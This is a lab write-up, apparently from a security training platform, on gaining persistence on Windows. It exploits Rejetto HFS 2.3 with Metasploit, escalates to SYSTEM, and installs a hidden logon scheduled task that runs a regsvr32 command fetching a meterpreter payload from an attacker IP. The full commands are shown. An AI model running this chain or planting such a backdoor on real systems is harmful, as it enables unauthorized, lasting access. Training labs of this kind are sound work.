Tactics: Persistence or Maintaining Access

Persistence consists of techniques that adversaries use to keep access to systems across restarts, changed credentials, and other interruptions that could cut off 
their access. Techniques used for persistence include any access, action, or configuration changes that let them maintain their foothold on systems, such as replacing or hijacking
legitimate code or adding startup code.

Techniques:

Scheduled Task/Job : Adversaries may abuse task scheduling functionality to facilitate initial or recurring execution of malicious code. Utilities exist within all major operating
systems to schedule programs or scripts to be executed at a specified date and time. A task can also be scheduled on a remote system, provided the proper authentication is met
(ex: RPC and file and printer sharing in Windows environments). Scheduling a task on a remote system typically may require being a member of an admin or otherwise privileged 
group on the remote system.

Procedure: 

I have done one lab of "Maintaining Access: Schtasks" in which firstly i have performed fingerprint of the target by using NMAP and i have found multiple ports are open
including port 80 and then now i have run NMAP gain to find out the version of service running on port 80 (nmap -sV -p 80 target ip). Once command completed i have observed that
httpFileServer 2.3 running on port 80 in target system. Now i am searching for any exploit for hfs 2.3 (searchsploit hfs) and found Rejetto HTTP File Server (HFS) 2.3 is vulnerable
to RCE.Now first phase completed.

Now open metasploit framework (msfconsole -q) and load exploit (exploit/windows/http/rejetto_hfs_exec) and also checke options and set values of all required parameters and
exploit the target.We have successfully exploit the target and get a meterpreter shell. Now 2nd phase completed.

Now i am checking the current user which i got after exploitation and got to know that i am running as administrator user so now i am going to elevate to the system priviege
to NT authrority (getsystem).After running getsystem i have elevated my privilege and now running as NT Authroity System and then
migrate current process to lsass.exe (ps -S lsass.exe ==> migrate pid of lsass.exe) because when we exploit any system,at that
time we are using temporary process and that process kill or terminate any time thatswhy we are migrating that process to 
permanent running processes like explorer.exe or lsass.exe. Now 3rd phase completed.

In this case i am going to configure a persistence backdoor using the exploit/multi/script/web_delivery metasploit module.
So we will generate a Regsvr32 malicious web delivery link for the persistence access. Then we will use the generated link
to create a taskthat will trigger the malicious link every time the user login into the system.

For generating malicious link, i am going to start another metasploit framework (msfconsole -q) and use below commands:
use exploit/multi/script/web_delivery
set payload windows/x64/meterpreter/reverse_tcp
set LHOST Attacker_IP
set target 3
exploit

Once above module runs, i will get a malicious link like "regsvr32 /s /n /u /i:http://attacker_ip:8080/5oq2CIKAnPFv08.sct scrobj.dll"
Now 4th phase completed.

Now i have to create a schedule task in the compromised system so go to meterpreter shell and load powershell (load powershell) 
and after loading run this command powershell_shell. Powershell is loaded now i am going to run schtaks to schedule a task that executes
powershell.exe to launch a malicious link on logon with system privilege.

schtasks /create /tn AttackDefense /tr "c:\windows\system32\WindowsPowerShell\v1.0\powershell.exe -WindowStyle hidden -NoLogo -NonInteractive -ep bypass -nop -c 'regsvr32 /s /n /u
/i:http://10.10.1.4:8080/5oq2CIKAnPFvO8.sct scrobj.dll'" /sc onlogon /ru System
Once above command execute successfully, a new schedule task named "AttackDefense" created.Now 5th phase completed.

Now if user of compromised system reboot their machine and system started, my scheduled task executed because i have added a condition
whenever user login my task executed and a reverse shell created towards my attacker ip.
But in my lab scenerio i have to reboot compomised machine, to do this firstly i have to back from powershell prompt so use ctrl+c
and now i am in meterpreter shell and run "reboot". Now 6th phase completed.

Once machine comes up and user login again, my schedule task runs and malicious link executed and i will get a meterpreter 
session on my attacker machine where i executed metasploit module for generating malicious link.

In this way we are maintaining access or creating persistence on compromised system. Now i am not going to exploit again and again
if compromised system reboot or shutdown because i have created a backdoor which executes whenever user login on the system.
